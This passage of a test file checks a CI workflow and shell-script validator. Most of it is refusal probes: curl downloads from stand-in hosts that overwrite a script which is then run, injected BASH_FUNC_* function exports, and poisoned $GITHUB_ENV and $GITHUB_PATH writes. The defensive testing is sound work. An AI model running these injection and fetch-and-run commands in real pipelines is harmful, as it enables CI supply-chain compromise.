    'cp -t scripts tools/evil.sh',
    'cp --target-directory=scripts tools/evil.sh',
    'ln -s ../tools/evil.sh scripts/',
    'cp tools/evil.sh .',
    'mv tools/evil.sh ./',
  ])
    refusesShell(
      `${writer}\nsource scripts/lib.sh`,
      /writes (?:scripts\/lib\.sh|into)|cannot read in a script that also sources/,
      bare,
      [lib],
    );
  refusesShell(
    'find /dev/null -fprintf scripts/lib.sh x\nsource scripts/lib.sh',
    /find builds command lines/,
    bare,
    [lib],
  );
  acceptsShell('cp tools/ok.txt /tmp/ok.txt\nsource scripts/lib.sh', bare, [lib]);
});

test('task 367 (adversarial review): placeholders, trapped returns, grouped sources, pattern unsets, writers and shell templates', () => {
  // the check's own placeholder spelled in the text is not a pasted expression
  const env = { env: { IMG: PIN } };
  for (const run of [
    'docker run --rm $__GHEXPR0__ evil:1 ${{ env.IMG }}',
    'echo ${{ env.IMG }}\ndocker run "$__GHEXPR0__"',
  ])
    assert.ok(
      infra([workflow(run, env)]).errors.some((e) => /__GHEXPR is reserved/.test(e)),
      run,
    );
  // while a placeholder of the step's own expressions stays readable in the scripts nested in it
  assert.deepEqual(
    infra([workflow('x="$(docker run "${{ env.IMG }}" true)"\nbash -c \'true\'', env)]).errors,
    [],
  );
  assert.deepEqual(
    infra([workflow('eval f; trap \'docker run "${{ env.IMG }}" true\' EXIT', env)]).errors.filter(
      (e) => /reserved/.test(e),
    ),
    [],
  );
  // a `return` inside a function body is ordinary: the file still defines its functions
  acceptsShell('source scripts/defs.sh\nfn', bare, [
    scriptFile('scripts/defs.sh', 'fn() { return 0; }'),
  ]);
  // a sourced file's trap can `return` between two commands, so it promises no function
  const call = "\npython3 -c 'import os'";
  const hit = /python3|source of a file that defines or unsets functions/;
  for (const trap of [
    "trap 'return 0' DEBUG",
    "trap 'return 0' ERR\nfalse",
    "trap 'return 0' RETURN",
  ])
    refusesShell(`source scripts/defs.sh${call}`, hit, bare, [
      scriptFile('scripts/defs.sh', `${trap}\n:\npython3() { :; }`),
    ]);
  // a group is not the top level: `{ source f; } &` and `{ source f; } | cat` run in a subshell
  const defs = scriptFile('scripts/defs.sh', 'python3() { :; }');
  for (const body of [
    `{ source scripts/defs.sh; } &\nwait${call}`,
    `{ source scripts/defs.sh; } | cat${call}`,
    `{ python3() { :; }; } &\nwait${call}`,
    `{ python3() { :; }; } | cat${call}`,
  ])
    refusesShell(body, hit, bare, [defs]);
  // `unset -f` with a brace list or a pattern removes functions by names the text does not spell
  for (const unset of [
    'unset -f {python3,x}',
    'unset -f python*',
    'unset -f pyth?n3',
    'unset -f "python[3]"',
  ])
    refusesShell(`source scripts/defs.sh\n${unset}${call}`, hit, bare, [defs]);
  // writers of a sourced file the first rules did not name
  const lib = scriptFile('scripts/lib.sh');
  for (const writer of [
    'uniq /tmp/e scripts/lib.sh',
    'curl -o lib.sh --output-dir scripts http://x',
    'curl -o lib.sh --output-dir=scripts http://x',
    "curl -w '%output{scripts/lib.sh}x' file:///dev/null",
    'curl --etag-save scripts/lib.sh http://x',
    'curl --hsts scripts/lib.sh http://x',
    'curl --alt-svc scripts/lib.sh http://x',
    'curl --ssl-sessions scripts/lib.sh http://x',
  ])
    refusesShell(
      `${writer}\nsource scripts/lib.sh`,
      /writes scripts\/lib\.sh|cannot read in a script that also sources|curl option/,
      bare,
      [lib],
    );
  acceptsShell('uniq /tmp/in\nsource scripts/lib.sh', bare, [lib]);
  // `shell:` is a command template GitHub runs around the script: only the named shells
  const step = (shell) =>
    workflowYaml(
      stringify({ jobs: { j: { steps: [{ run: 'true', ...(shell ? { shell } : {}) }] } } }),
    );
  for (const shell of ['docker run -i evil:1 sh {0}', 'bash -c {0}', 'sudo bash {0}'])
    assert.ok(
      infra([step(shell)]).errors.some((e) => /shell: .* command template/.test(e)),
      shell,
    );
  for (const place of ['workflow', 'job'])
    assert.ok(
      infra([
        workflowYaml(
          stringify(
            place === 'workflow'
              ? {
                  defaults: { run: { shell: 'docker run -i evil:1 sh {0}' } },
                  jobs: { j: { steps: [{ run: 'true' }] } },
                }
              : {
                  jobs: {
                    j: {
                      defaults: { run: { shell: 'docker run -i evil:1 sh {0}' } },
                      steps: [{ run: 'true' }],
                    },
                  },
                },
          ),
        ),
      ]).errors.some((e) => /command template/.test(e)),
      place,
    );
  // task 368 L1: the run text is always read as bash, so a step in another shell is refused too
  for (const shell of ['pwsh', 'powershell', 'python', 'cmd'])
    assert.ok(
      infra([step(shell)]).errors.some((e) => /shell: .* command template/.test(e)),
      shell,
    );
  for (const shell of ['bash', 'sh', undefined])
    assert.deepEqual(infra([step(shell)]).errors, [], String(shell));
});

// --- task 368 (PR #941 review r1, claude-opus @ f2e6e998): inherited state, indirect vectors, scoped pastes, curl ----
// Every row is a probe of ~/rasta-audit/reviews/PR-941.md: the checker accepted it while real bash 5.2 / curl 8.5
// ran alpine:latest or overwrote a script it had read.
const READ = 'docker run "$X_IMAGE" true';
const NOT_FROZEN = /is not pinned by digest|names X_IMAGE|no preamble readonly literal/;

test('task 368 F1: a shell that already ran has no preamble - substitutions, backticks and eval text inherit', () => {
  // (a) the name is already readonly (any spelling), so the substitution's own `readonly` fails and the outer value stays
  const inner = `readonly X_IMAGE=${PIN}\n${READ}`;
  for (const before of [
    'readonly X_IMAGE=alpine:latest',
    'declare -r X_IMAGE=alpine:latest',
    'typeset -r X_IMAGE=alpine:latest',
    'X_IMAGE=alpine:latest\nreadonly X_IMAGE',
  ]) {
    refusesWhy(`set -euo pipefail\n${before}\nx="$(${inner})"`, NOT_FROZEN);
    refusesWhy(`set -euo pipefail\n${before}\nx=\`${inner}\``, NOT_FROZEN); // (b) backticks
  }
  // text a substitution, a subshell or a trap reads gets what the outer shell froze, not its own declaration
  refusesWhy(`x="$(set -euo pipefail\nreadonly X_IMAGE=${PIN}\n${READ})"`, NOT_FROZEN);
  refusesWhy(`( set -euo pipefail; readonly X_IMAGE=${PIN}; ${READ} )`, NOT_FROZEN);
  refusesWhy(
    `trap 'set -euo pipefail; readonly X_IMAGE=${PIN}; ${READ}' EXIT`,
    /trap runs a handler/,
  );
  // controls: what the outer shell froze is read inside, and a NEW shell (bash reading a here-document) has its own preamble
  acceptsBoth(`${decl()}x="$(${READ})"\ny=\`${READ}\``);
  acceptsBoth(`bash <<'EOF'\n${decl()}${READ}\nEOF`);
  acceptsBoth(`${decl()}bash <<'EOF'\n${decl()}${READ}\nEOF`);
});

test('task 368 F1: a sourced file runs in a shell that already ran, so its preamble proves nothing (probe c)', () => {
  const lib = scriptFile('scripts/lib.sh', `${decl()}${READ}`);
  for (const source of [
    'source scripts/lib.sh',
    '. scripts/lib.sh',
    'if true; then source scripts/lib.sh; fi',
  ])
    refusesShell(
      `declare -r X_IMAGE=alpine:latest\n${source}\n`,
      /sources scripts\/lib\.sh, which declares readonly names/,
      bare,
      [lib],
    );
  // the file itself, run as a program, is fine; a sourced file without a preamble is unchanged
  acceptsShell('bash scripts/lib.sh', bare, [lib]);
  acceptsShell('source scripts/defs.sh\nfn', bare, [
    scriptFile('scripts/defs.sh', 'fn() { return 0; }'),
  ]);
});

test('task 368 F1: a parent hands a child shell functions through the environment (probes d, e)', () => {
  const child = scriptFile('scripts/x.sh', `${decl('IMAGE')}docker run "$IMAGE" true`);
  const step = (env, stepEnv) =>
    workflowYaml(
      stringify({
        ...(env ? { env } : {}),
        jobs: {
          j: { steps: [{ run: 'bash scripts/x.sh', ...(stepEnv ? { env: stepEnv } : {}) }] },
        },
      }),
    );
  for (const key of ['BASH_FUNC_readonly%%', 'BASH_FUNC_set%%', 'BASH_FUNC_x%%'])
    for (const file of [
      step({ IMAGE: 'alpine:latest', [key]: '() { :; }' }),
      step(undefined, { [key]: '() { :; }' }),
    ])
      assert.ok(
        infra([child, file]).errors.some((e) =>
          /env sets BASH_FUNC_.*, which a shell evaluates at startup/.test(e),
        ),
        key,
      );
  for (const parent of [
    'readonly() { :; }; export -f readonly; IMAGE=alpine:latest; export IMAGE; bash scripts/x.sh',
    'readonly() { :; }\ndeclare -fx readonly\nbash scripts/x.sh',
    'readonly() { :; }\ntypeset -f -x readonly\nbash scripts/x.sh',
    'export -nf readonly',
    'set -a\nreadonly() { :; }\nbash scripts/x.sh',
    'set -ea\nreadonly() { :; }',
    'set -o allexport\nreadonly() { :; }',
    "env 'BASH_FUNC_readonly%%=() { :; }' bash scripts/x.sh",
    'BASH_FUNC_readonly%%="() { :; }" bash scripts/x.sh',
  ])
    refusesShell(parent, /exports shell functions|evaluates at startup/, bare, [child]);
  // the preamble's own `set -euo pipefail` and an ordinary `export NAME` stay
  acceptsShell('set -euo pipefail\nexport KEY=1\nbash scripts/x.sh', bare, [child]);
  // $GITHUB_ENV can define BASH_FUNC_* for every later step
  refusesWhy('echo "BASH_FUNC_readonly%%=() { :; }" >> "$GITHUB_ENV"', /evaluates at startup/);
  refusesWhy('echo "BASH_FUNC_x=1" >> "$GITHUB_ENV"', /appends BASH_FUNC_x to \$GITHUB_ENV/);
});

test('task 368 L2: bash expands a leading ~ in an assignment, so a preamble value with one is no literal', () => {
  for (const value of ['~/img', 'a:~/b', '~root/x'])
    imageRefused(`${decl('X_IMAGE', value)}${READ}`, NOT_FROZEN);
  // an executed program named through such a value: bash runs $HOME/r/scripts/lib.sh, not the literal
  const lib = scriptFile('scripts/lib.sh');
  const policy = {
    ...bare,
    executedPrograms: new Map([
      ['scripts/x.sh', { words: ['${TOOL_BIN}/scripts/lib.sh'], reason: 'r' }],
    ]),
  };
  acceptsShell(`${decl('TOOL_BIN', '/r')}"\${TOOL_BIN}/scripts/lib.sh"`, policy, [lib]);
  for (const value of ['~/r', '~root', 'a:~/r'])
    refusesShell(
      `${decl('TOOL_BIN', value)}"\${TOOL_BIN}/scripts/lib.sh"`,
      /runs .*, a file this check does not read/,
      policy,
      [lib],
    );
});

test('task 368 F2: every indirect expansion is a vector, whatever operator follows (not an operator list)', () => {
  const run = (word) => `arr=(x=y alpine:latest); ref='arr[@]'\ndocker run -e ${word} ${PIN} true`;
  for (const word of [
    '"${!ref}"',
    '"${!ref,}"',
    '"${!ref:-}"',
    '"${!ref:-x}"',
    '"${!ref#}"',
    '"${!ref%x}"',
    '"${!ref/x/y}"',
    '"${!ref:0}"',
    '"${!ref^^}"',
    '"${!ref@Q}"',
    '"${!pre@}"',
    '"${!pre*}"',
    '"${u:-${!ref:-}}"',
    '"${u:-${!ref}}"',
    '"x${!ref:-}"',
    '"${arr[@]:-y}"',
    '"${arr[@]%x}"',
  ])
    refusesWhy(run(word), /before its image/);
  // the same rule reads a wrapper's operands
  refusesWhy(`arr=(a b); ref='arr[@]'\nenv "\${!ref:-}" docker run ${PIN} true`, /expansion|word/);
  // controls: a plain name and a single-quoted text are one word
  acceptsBoth(`u=x; docker run -e "\${u:-y}" -e '\${!ref:-}' ${PIN} true`);
  acceptsBoth(`u=x; docker run -e "\${u#x}" -e "\${#u}" -e "$u" ${PIN} true`);
});

test('task 368 F3: a ${{ env }} paste is the env of THIS step, never empty, and always one quoted word', () => {
  const wf = (steps, top) => workflowYaml(stringify({ ...top, jobs: { j: { steps } } }));
  const sh = (run, env) => ({ run, ...(env ? { env } : {}) });
  const refused = (files, why) => {
    const { errors } = infra(Array.isArray(files) ? files : [files]);
    assert.ok(
      errors.some((e) => why.test(e)),
      `${why}: ${errors.join('\n')}`,
    );
  };
  const use = `docker run -e "\${{ env.N }}" ${PIN} alpine`;
  // an empty value pastes nothing: `-e PIN alpine` runs alpine (latest)
  for (const run of [
    `docker run -e \${{ env.N }} ${PIN} alpine`,
    `docker run --label \${{ env.N }} ${PIN} alpine`,
    use,
  ])
    refused(wf([sh(run)], { env: { N: '' } }), /pasted into the script/);
  // a name another step or another job defines is empty here
  refused(wf([sh('true', { N: 'x=y' }), sh(use)]), /pasted into the script/);
  refused(
    workflowYaml(
      stringify({ jobs: { a: { env: { N: 'x=y' }, steps: [] }, b: { steps: [sh(use)] } } }),
    ),
    /pasted into the script/,
  );
  // unquoted, the value is split by the shell: refused even when it is not empty
  refused(
    wf([sh(`docker run -e \${{ env.N }} ${PIN} alpine`)], { env: { N: 'x=y' } }),
    /before its image/,
  );
  refused(
    wf([sh('docker run ${{ env.N }} true')], { env: { N: PIN } }),
    /unquoted or vector expansion/,
  );
  // the innermost value is the one pasted: a step env overrides the workflow's
  refused(
    wf([sh('docker run "${{ env.N }}" true', { N: 'alpine:latest' })], { env: { N: PIN } }),
    /not pinned by digest/,
  );
  assert.deepEqual(
    infra([wf([sh('docker run "${{ env.N }}" true', { N: PIN })], { env: { N: 'alpine:latest' } })])
      .errors,
    [],
  );
  // $GITHUB_ENV defines names for later steps (replacing the value this check read)
  refused(
    wf([sh('echo "N=alpine:latest" >> "$GITHUB_ENV"'), sh('docker run "${{ env.N }}" true')], {
      env: { N: PIN },
    }),
    /\$\{\{ env\.N \}\} is pasted, but a step appends N to \$GITHUB_ENV/,
  );
  refused(
    [
      wf([sh('docker run "${{ env.N }}" true')], { env: { N: PIN } }),
      scriptFile('scripts/w.sh', 'echo "N=alpine:latest" >> "${GITHUB_ENV}"'),
    ],
    /is pasted, but a step appends N to \$GITHUB_ENV/,
  );
  // a write whose name this check cannot read, or any other command naming the file, is refused
  for (const body of [
    'echo "$1=$2" >> "$GITHUB_ENV"',
    'printf "N=x\\n" >> "$GITHUB_ENV"',
    'cat >> "$GITHUB_ENV" <<EOF\nN=x\nEOF',
    'tee -a "$GITHUB_ENV" < f',
    'cp f "$GITHUB_ENV"',
    'node w.js "$GITHUB_ENV"',
    'echo N=x | tee "$GITHUB_ENV"',
  ])
    refusesWhy(body, /names \$GITHUB_ENV in a form this check does not read/);
  // a reviewed entry may name the writes of a computed `echo "$1=$2"`; the names it lists are not pasteable
  const writer = scriptFile('scripts/w.sh', 'echo "$1=$2" >> "${GITHUB_ENV}"');
  const reviewed = {
    ...bare,
    reviewedPrograms: new Map([
      ['scripts/w.sh', { programs: [], githubEnv: ['N'], envValues: ['1', '2'], reason: 'r' }],
    ]),
  };
  assert.deepEqual(
    infra([wf([sh('true')]), writer], reviewed).errors.filter((e) => /GITHUB_ENV/.test(e)),
    [],
  );
  refused(
    [wf([sh('docker run "${{ env.N }}" true')], { env: { N: PIN } }), writer],
    /names \$GITHUB_ENV in a form/,
  );
  refused(
    [wf([sh('docker run "${{ env.N }}" true')], { env: { N: PIN } }), writer],
    /names \$GITHUB_ENV in a form/,
  );
  assert.ok(
    infra(
      [wf([sh('docker run "${{ env.N }}" true')], { env: { N: PIN } }), writer],
      reviewed,
    ).errors.some((e) => /is pasted, but a step appends N/.test(e)),
  );
  // controls: a test of the file, the real-tree shape
  acceptsBoth('if [ -n "${GITHUB_ENV:-}" ]; then echo hi; fi');
  assert.deepEqual(
    infra([wf([sh('docker run -d "${{ env.N }}" server')], { env: { N: PIN } })]).errors,
    [],
  );
});

test('task 368 F4: curl has an allowlist of options; an abbreviation, a config or a format file cannot write a script', () => {
  const lib = scriptFile('scripts/lib.sh');
  for (const option of [
    '--dump-head scripts/lib.sh',
    '--dump-header scripts/lib.sh',
    '--stde scripts/lib.sh',
    '--stderr scripts/lib.sh',
    '--cookie-j scripts/lib.sh',
    '--cookie-jar scripts/lib.sh',
    '--expand-output scripts/lib.sh',
    '--outp scripts/lib.sh',
    '--output-dir scripts',
    '-w @scripts/fmt',
    '--write-out @scripts/fmt',
    '-w@scripts/fmt',
    '--write-out=@scripts/fmt',
    "-w '%output{scripts/lib.sh}x'",
    "--write-out '%{http_code}%output{scripts/lib.sh}'",
    "-H '%output{scripts/lib.sh}'",
    '--conf scripts/cfg',
    '--config scripts/cfg',
    '-K scripts/cfg',
    '-q',
    '--next',
    '--libcurl scripts/lib.sh',
    '--trace scripts/lib.sh',
    '--trace-ascii scripts/lib.sh',
    '-O',
    '-J',
    '--remote-name',
    '--hsts scripts/lib.sh',
    '--etag-save scripts/lib.sh',
    '--alt-svc scripts/lib.sh',
    '--ssl-sessions scripts/lib.sh',
    '--no-such-option',
    '--silent=x',
    '--',
    '-c scripts/lib.sh',
    '-D scripts/lib.sh',
    '-fsSD scripts/lib.sh',
    '-z scripts/lib.sh',
  ])
    refusesShell(
      `curl ${option} https://x\nbash scripts/lib.sh`,
      /curl option .* is not one this check reads/,
      bare,
      [lib],
    );
  // the control: -o to a script is a write of that file; -o elsewhere is fine
  refusesShell(
    'curl -o scripts/lib.sh https://x\nbash scripts/lib.sh',
    /writes scripts\/lib\.sh/,
    bare,
    [lib],
  );
  acceptsShell('curl -fsS https://x -o /tmp/out\nbash scripts/lib.sh', bare, [lib]);
  // what the real tree uses
  for (const body of [
    'curl -fsS http://localhost:9000/minio/health/live >/dev/null 2>&1',
    'curl -sfo /dev/null "http://localhost:8080/realms/rasta/.well-known/openid-configuration"',
    "curl -s -o /dev/null -w '%{http_code}' http://localhost:3000/health",
    'curl --silent --show-error --fail --location --max-time 5 --header "Accept: x" --request POST http://x',
    "curl -fsS -w '%{http_code}' -H 'A: b' -X GET -m 3 http://x",
  ])
    acceptsBoth(body);
  // ~/.curlrc and the variables that find it name an output file by a path no script shows
  for (const body of [
    'CURL_HOME=. curl https://x',
    'HOME=. curl https://x',
    'XDG_CONFIG_HOME=. curl https://x',
    'echo "output=scripts/lib.sh" > ~/.curlrc',
    'cp c .curlrc',
  ])
    refusesShell(`${body}\nbash scripts/lib.sh`, /evaluates at startup/, bare, [lib]);
});

test('task 368 L1 + L3: only bash and sh read the run text as bash; the whole tree is read unless a caller says otherwise', () => {
  for (const shellName of ['pwsh', 'powershell', 'python', 'cmd'])
    assert.ok(
      infra([
        workflowYaml(stringify({ jobs: { j: { steps: [{ shell: shellName, run: 'true' }] } } })),
      ]).errors.some((e) => /shell: .* command template/.test(e)),
      shellName,
    );
  // L3: no `complete` in the policy is the gated behaviour: a listed file that is missing is an error ...
  const listed = {
    ...bare,
    reviewedPrograms: new Map([['infra/gone.sh', { programs: ['awk'], reason: 'r' }]]),
  };
  const files = [scriptFile('scripts/x.sh', 'true')];
  assert.ok(
    validateWholeTree(files, listed).errors.some((e) =>
      /REVIEWED_PROGRAMS lists infra\/gone\.sh/.test(e),
    ),
  );
  assert.ok(
    validateWholeTree(files, { ...listed, complete: undefined }).errors.some((e) =>
      /REVIEWED_PROGRAMS lists/.test(e),
    ),
  );
  // ... and only an explicit `complete: false` reads part of the tree
  assert.deepEqual(validateWholeTree(files, { ...listed, complete: false }).errors, []);
});

// --- task 368: the siblings the fresh-context review of this round found (probes executed with real bash 5.2 / curl 8.5) ---
test('task 368 review: shell options that export functions or read startup files (bash -a, -o allexport, -l, -i, #! options)', () => {
  const child = scriptFile('scripts/x.sh', `${decl('IMAGE')}docker run "$IMAGE" true`);
  for (const parent of [
    "bash -a -c 'readonly() { :; }; bash scripts/x.sh'",
    "bash -ea -c 'true'",
    "sh -a -c 'true'",
    'bash -a scripts/q.sh',
    "bash -o allexport -c 'true'",
    "bash -o AllExport -c 'true'",
    'bash -l scripts/x.sh',
    'bash --login scripts/x.sh',
    'bash -i scripts/x.sh',
    'bash -il scripts/x.sh',
    'env bash -a scripts/x.sh',
  ])
    refusesShell(parent, /exports functions|startup files|not one this check reads/, bare, [child]);
  // controls: the options the preamble and the reviewed scripts use
  acceptsShell('bash -eu scripts/x.sh', bare, [child]);
  acceptsShell('bash -o pipefail scripts/x.sh', bare, [child]);
  acceptsShell('bash --noprofile --norc scripts/x.sh', bare, [child]);
  // the #! line is an option list the file's own text never shows
  for (const first of ['#!/bin/bash -a', '#!/usr/bin/env -S bash -a', '#!/bin/bash -eo allexport'])
    refusesShell(`${first}\ntrue\n`, /#! line is not/);
  for (const first of ['#!/bin/bash', '#!/usr/bin/env bash', '#! /bin/sh'])
    acceptsShell(`${first}\ntrue\n`);
});

test('task 368 review: backslash-newline inside ${…} does not hide a vector (bash deletes it first)', () => {
  const run = (word) => `arr=(x=y alpine:latest)\ndocker run --label ${word} ${PIN} true`;
  for (const word of [
    '"${arr[\\\n@]}"',
    '"${\\\n@}"',
    '"${\\\n!ref}"',
    '"${arr[@\\\n]}"',
    '"${!\\\nref:-}"',
  ])
    refusesWhy(run(word), /before its image/);
});

test('task 368 review: curl cannot write through a URL-glob template, a computed word, a computed format or an env config', () => {
  const lib = scriptFile('scripts/lib.sh');
  for (const body of [
    "curl -o 'scripts/#1' 'https://x.example/{lib.sh}'",
    "curl --output 'scripts/#1' 'https://x.example/{lib.sh}'",
    "curl -sSfLo 'scripts/#1' 'https://x.example/{lib.sh}'",
    'f=\'%{url}%output{scripts/lib.sh}x\'; curl -sS -w "$f" https://x',
    'curl -sS -w "${a}ut{scripts/lib.sh}" https://x',
    'curl -o "$f" https://x',
    'a=-o; b=scripts/lib.sh; curl -sS "$a" "$b" https://x',
    'opts="-o scripts/lib.sh"; curl -sS $opts https://x',
    'c() { curl "$@"; }\nc --output scripts/lib.sh https://x',
    'c() { curl -K cfg "$1"; }\nc https://x',
  ])
    refusesShell(
      `${body}\nbash scripts/lib.sh`,
      /curl option .* is not one this check reads/,
      bare,
      [lib],
    );
  // the config-file variables as workflow/step/job env KEYS (the word form was refused already)
  for (const key of ['CURL_HOME', 'HOME', 'XDG_CONFIG_HOME', 'curlrc'])
    assert.ok(
      infra([
        workflowYaml(
          stringify({ jobs: { j: { env: { [key]: '.' }, steps: [{ run: 'curl https://x' }] } } }),
        ),
      ]).errors.some((e) => /env sets .*, which a shell evaluates at startup/.test(e)),
      key,
    );
});

test('task 368 review: GITHUB_ENV writes define the names they write (one line), GITHUB_PATH by tee, env names ignore case', () => {
  const wf = (steps, top) => workflowYaml(stringify({ ...top, jobs: { j: { steps } } }));
  const sh = (run, env) => ({ run, ...(env ? { env } : {}) });
  const use = sh('docker run "${{ env.X_IMAGE }}" true');
  // a second line (a real newline, a \n of echo -e, a literal \n) defines another name
  for (const body of [
    'echo "A=1\nX_IMAGE=alpine:latest" >> "$GITHUB_ENV"',
    'echo -e "A=1\\nX_IMAGE=alpine:latest" >> "$GITHUB_ENV"',
    'echo -n "A=1" >> "$GITHUB_ENV"',
    'echo A=1 B=2 >> "$GITHUB_ENV"',
  ])
    assert.ok(
      infra([wf([sh(body), use], { env: { X_IMAGE: PIN } })]).errors.some((e) =>
        /names \$GITHUB_ENV in a form this check does not read/.test(e),
      ),
      body,
    );
  // GITHUB_PATH through tee, not only a redirect
  refusesWhy('echo /tmp/evil | tee -a "$GITHUB_PATH"', /appends to GITHUB_PATH/);
  refusesWhy('echo /tmp/evil >> "$GITHUB_PATH"', /appends to GITHUB_PATH/);
  // env names are case-insensitive in an expression: a lower-case step env replaces the workflow's
  assert.ok(
    infra([
      wf([sh('docker run "${{ env.X_IMAGE }}" true', { x_image: 'alpine:latest' })], {
        env: { X_IMAGE: PIN },
      }),
    ]).errors.some((e) => /not pinned by digest/.test(e)),
  );
  assert.ok(
    infra([
      wf([sh('echo "x_image=alpine:latest" >> "$GITHUB_ENV"'), use], { env: { X_IMAGE: PIN } }),
    ]).errors.some((e) => /is pasted, but a step appends X_IMAGE to \$GITHUB_ENV/.test(e)),
  );
});

test('task 368 (CI of 4f77554e): the shared shellInvocation refuses startup-state options only when asked - the Jest-launch guard reads bash -lc', () => {
  const words = (...values) => values.map((value) => ({ value }));
  for (const option of ['-lc', '-l', '-ic', '-ac', '--login'])
    assert.deepEqual(
      shellInvocation(words(option, 'true'), 'bash').problem,
      undefined,
      `${option}: the default reads it`,
    );
  assert.deepEqual(shellInvocation(words('-lc', 'true'), 'bash').body, { value: 'true' });
  for (const option of ['-lc', '-l', '-ic', '-ac', '--login'])
    assert.match(
      shellInvocation(words(option, 'true'), 'bash', { startupState: true }).problem,
      /exports functions or reads startup files/,
      option,
    );
  assert.match(
    shellInvocation(words('-o', 'allexport', '-c', 'true'), 'bash', { startupState: true }).problem,
    /allexport/,
  );
  assert.equal(
    shellInvocation(words('-o', 'pipefail', '-c', 'true'), 'bash', { startupState: true }).problem,
    undefined,
  );
});

// --- task 370 (PR #941 r2 review): B1 file-command spellings, B2 computed option words, B3 writer options, FU1, FU2 ----

test('task 370 B1: a write the check cannot read refuses wherever the script stands - the runner reads $GITHUB_ENV between steps', () => {
  const wf = (steps, top) =>
    workflowYaml(stringify({ env: { X_IMAGE: PIN }, ...top, jobs: { j: { steps } } }));
  const use = { run: 'docker run "${{ env.X_IMAGE }}" true' };
  const unread = /writes to a path this check cannot read/;
  // probe rows a-f, h, j-l of the review: every spelling of the env or path file the check cannot read
  for (const run of [
    'echo "X_IMAGE=alpine:latest" >> "$OUT"', // a: an alias variable (its env value is the file)
    'a=GITHUB_; b=ENV; n=$a$b\necho "X_IMAGE=alpine:latest" >> "${!n}"', // b
    'echo "X_IMAGE=alpine:latest" >> "$RUNNER_TEMP"/_runner_file_commands/set_env_x', // c
    'printf \'%s_ENV=/tmp/e\\n\' BASH >> "$OUT"', // d: sets BASH_ENV for the later steps
    'printf \'BASH_%s_readonly%%%%=() { :; }\\n\' FUNC >> "$OUT"', // e: BASH_FUNC_*
    'echo /tmp/evil >> "$OUT"', // f: the path file
    'cp f "$OUT"', // j
    'printf \'/tmp/evil\\n\' | uniq - "$OUT"', // uniq's first operand may be -
    'uniq -u - "$OUT" </dev/null',
    'echo "X_IMAGE=alpine:latest" | tee -a "$OUT"', // k
    'exec 3>> "$OUT"\necho "X_IMAGE=alpine:latest" >&3', // l
    'echo x >> /home/runner/work/_temp/_runner_file_commands/set_env_x', // absolute, literal
    'echo x >> ../../_temp/_runner_file_commands/set_env_x', // climbs out of the checkout
    'echo x >> ~/work/_temp/_runner_file_commands/set_env_x', // under ~
    'echo x >> /proc/self/cwd/scripts/lib.sh', // the checkout through /proc
  ])
    assert.ok(
      infra([wf([{ run, env: { OUT: 'x' } }, use])]).errors.some((e) => unread.test(e)),
      run,
    );
  // a named descriptor writes like a redirect; a write after `cd` is relative to somewhere else (the runner's _temp)
  refusesShell('echo evil {fd}>>scripts/lib.sh', /cannot read|writes into|writes scripts/, bare, [
    scriptFile('scripts/lib.sh'),
  ]);
  refusesShell('echo x {fd}>> "$OUT"', unread);
  refusesShell(
    'cd /home/runner/work/_temp/_runner_file_commands\necho "X=1" >> set_env_abc',
    unread,
  );
  refusesShell('cd "$D"\ncp a b', unread);
  acceptsShell('cp a b\nprintf x > out.txt');
  // the variables curl finds its configuration by, set without an = (read, printf -v, for): a bare word is refused too
  for (const body of [
    'read HOME <<< /tmp/h',
    'printf -v HOME %s /tmp/h',
    'for HOME in /tmp/h; do :; done',
    'read CURL_HOME',
    'printf -v XDG_CONFIG_HOME %s x',
  ])
    refusesShell(`${body}\ncurl -fsS https://x`, /sets a variable under the name/);
  // other runner variables are no file this check reads (only ENV and PATH by their own forms; summary and output)
  refusesShell('echo x >> "$GITHUB_STATE"', unread);
  refusesShell('echo x >> "$GITHUB_WORKSPACE"', unread);
  // a `[[` that is only an argument is no test: its `>` redirects
  refusesShell('echo [[ x > "$f"', unread);
  acceptsShell('[[ "$a" > "$b" ]] && true');
  // g: a function named after echo makes `echo "SAFE=1" >> "$GITHUB_ENV"` something else
  refusesWhy(
    'echo() { printf \'%s\\nX_IMAGE=alpine:latest\\n\' "$1"; }\necho "SAFE=1" >> "$GITHUB_ENV"',
    /defines a function or alias named echo/,
  );
  for (const name of ['printf', 'cp', 'curl', 'docker', 'set', 'tee'])
    refusesWhy(`${name}() { :; }`, new RegExp(`defines a function or alias named ${name}`));
  acceptsShell('publish() { echo "$1"; }\npublish x');
  // a definition the tokenizer does not report: after `{`, `(`, then, do, in a function body, `function` in a group
  for (const body of [
    '{ echo() { printf "X_IMAGE=a\\n"; }; }',
    '( echo() { :; }; echo a )',
    'if true; then echo() { :; }; fi',
    'for i in 1; do echo() { :; }; done',
    'f() { echo() { :; }; }\nf',
    '{ function cat { :; }; }',
    'bash -O expand_aliases -c \'alias echo="printf X_IMAGE=a;:"; true\'',
    'alias cat=true',
    'true && cat() { :; }',
  ])
    refusesShell(
      `${body}\necho "A=1" >> "$GITHUB_ENV"`,
      /defines a function or alias named (echo|cat)/,
    );
  // h: a newline in the value defines another name; only a variable a reviewed entry lists may be expanded
  for (const run of [
    'echo "SAFE=$(printf \'a\\nX_IMAGE=alpine:latest\')" >> "$GITHUB_ENV"',
    'v="$(cat f)"\necho "SAFE=$v" >> "$GITHUB_ENV"',
    'echo "SAFE=`cat f`" >> "$GITHUB_ENV"',
    'echo "SAFE=${v:-x}" >> "$GITHUB_ENV"',
  ])
    assert.ok(
      infra([wf([{ run }, use])]).errors.some((e) =>
        /names \$GITHUB_ENV in a form this check does not read/.test(e),
      ),
      run,
    );
  const listed = {
    ...bare,
    reviewedPrograms: new Map([
      ['.github/workflows/ci.yml', { programs: [], envValues: ['v'], reason: 'r' }],
    ]),
  };
  assert.deepEqual(
    infra([wf([{ run: 'v="$(openssl rand -hex 8)"\necho "SAFE=${v}" >> "$GITHUB_ENV"' }, use])], {
      ...listed,
      reviewedPrograms: new Map([
        ['.github/workflows/ci.yml', { programs: ['openssl'], envValues: ['v'], reason: 'r' }],
      ]),
      complete: false,
    }).errors,
    [],
  );
  // controls: the literal forms stay accepted, and so do the summary and the output file
  acceptsShell('echo "SAFE=1" >> "$GITHUB_ENV"');
  acceptsShell('echo "## done" >> "$GITHUB_STEP_SUMMARY"\necho "k=v" >> "$GITHUB_OUTPUT"');
});

test('task 370 B1: the expression that names the env, path or output file is refused; the other properties of github are not', () => {
  const wf = (value) =>
    workflowYaml(
      stringify({ jobs: { j: { steps: [{ env: { OUT: value }, run: 'echo "$OUT"' }] } } }),
    );
  for (const value of [
    '${{ github.env }}',
    '${{ github.path }}',
    '${{ github.output }}',
    '${{ github.state }}',
    '${{ github . env }}',
    '${{ GITHUB.ENV }}',
